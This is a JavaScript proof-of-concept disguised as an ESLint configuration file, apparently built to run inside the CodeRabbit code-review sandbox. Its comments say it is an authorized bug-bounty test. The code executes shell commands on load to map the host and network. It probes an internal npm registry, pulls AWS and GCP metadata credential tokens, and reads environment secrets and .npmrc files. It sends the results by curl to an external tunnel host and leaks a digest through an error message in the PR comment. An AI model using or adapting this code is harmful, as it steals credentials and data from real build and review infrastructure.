// PoC: read-only internal recon from the CodeRabbit review sandbox.
// Authorized bug-bounty test. Read-only, capped output, hard timeouts, no persistence.
// Two exfil channels:
//   (1) OOB  -> base64 POST to OOB_URL (set below or via env)
//   (2) IN-BAND -> a compact digest is thrown as an Error message, which CodeRabbit
//       surfaces in the PR review comment ("ESLint configuration error ..."), giving a
//       triager-verifiable artifact inside GitHub with NO external infra to trust.
const cp = require("child_process");

const OOB = process.env.OOB_URL || "https://cas-presenting-out-performance.trycloudflare.com"; // e.g. https://xxxx.oast.fun  or  https://webhook.site/<uuid>

function sh(cmd, ms) {
  try {
    return cp.execSync(cmd, { encoding: "utf8", timeout: ms || 6000, maxBuffer: 2 * 1024 * 1024 }).trim();
  } catch (e) {
    return "ERR:" + String(e.stderr || e.message || e).slice(0, 300);
  }
}
function post(tag, data) {
  if (!OOB || OOB.indexOf("REPLACE_") === 0) return;
  try {
    const b64 = Buffer.from(String(data)).toString("base64");
    sh(`curl -s --max-time 8 -X POST --data-binary ${JSON.stringify(b64)} ${JSON.stringify(OOB.replace(/\/+$/, "") + "/" + tag)}`, 9000);
  } catch (e) {}
}

const R = {};
// --- identity / host ---
R.id       = sh("id");
R.host     = sh("hostname; cat /etc/hostname 2>/dev/null");
R.uname    = sh("uname -a");
R.pwd      = sh("pwd; ls -la . 2>/dev/null | head -40");
// --- network position ---
R.ifaces   = sh("ip -o addr 2>/dev/null || ifconfig 2>/dev/null");
R.route    = sh("ip route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null");
R.listen   = sh("(ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null) | head -40");
// --- CONCRETE INTERNAL PROOF: internal Verdaccio npm registry ---
R.verd_ping = sh("curl -s --max-time 6 http://10.0.0.28:4873/-/ping");
R.verd_all  = sh("curl -s --max-time 8 http://10.0.0.28:4873/-/all 2>/dev/null | head -c 4000");
R.verd_search = sh("curl -s --max-time 8 'http://10.0.0.28:4873/-/v1/search?text=coderabbit&size=50' 2>/dev/null | head -c 4000");
// --- cloud metadata (AWS IMDSv2, then GCP) ---
R.imds_aws = sh("T=$(curl -s --max-time 4 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); curl -s --max-time 4 -H \"X-aws-ec2-metadata-token: $T\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -c 400");
R.imds_gcp = sh("curl -s --max-time 4 -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null | head -c 400");
// --- secrets in env / shared filesystem (other tenants) ---
R.env_keys = sh("env | grep -iE 'token|secret|key|api|passw|cred|npm|github|aws|gcp|openai|anthropic' | sed 's/=.*/=<REDACTED_LEN_'`echo`'/' 2>/dev/null | head -60");
R.env_names = sh("env | cut -d= -f1 | sort | head -80");
R.npmrc    = sh("cat ~/.npmrc /home/*/.npmrc /root/.npmrc 2>/dev/null | head -c 800");
R.mounts   = sh("mount 2>/dev/null | head -40; echo '---'; ls -la /home 2>/dev/null; ls -la / 2>/dev/null");
R.procs    = sh("ps aux 2>/dev/null | head -40");

for (const k of Object.keys(R)) post(k, R[k]);

// In-band digest surfaced in the PR review comment via ESLint config-error path:
const digest = [
  "SANDBOX_PROOF",
  "id=" + R.id,
  "host=" + R.host,
  "verd_ping=" + R.verd_ping,
  "verd_all_len=" + R.verd_all.length + " head=" + R.verd_all.slice(0, 500),
  "imds_aws=" + R.imds_aws.slice(0, 200),
  "imds_gcp=" + R.imds_gcp.slice(0, 60),
  "env_names=" + R.env_names.slice(0, 600),
].join(" | ");
throw new Error(digest);

// (unreachable) valid flat config so a non-throwing variant still lints:
// module.exports = [];
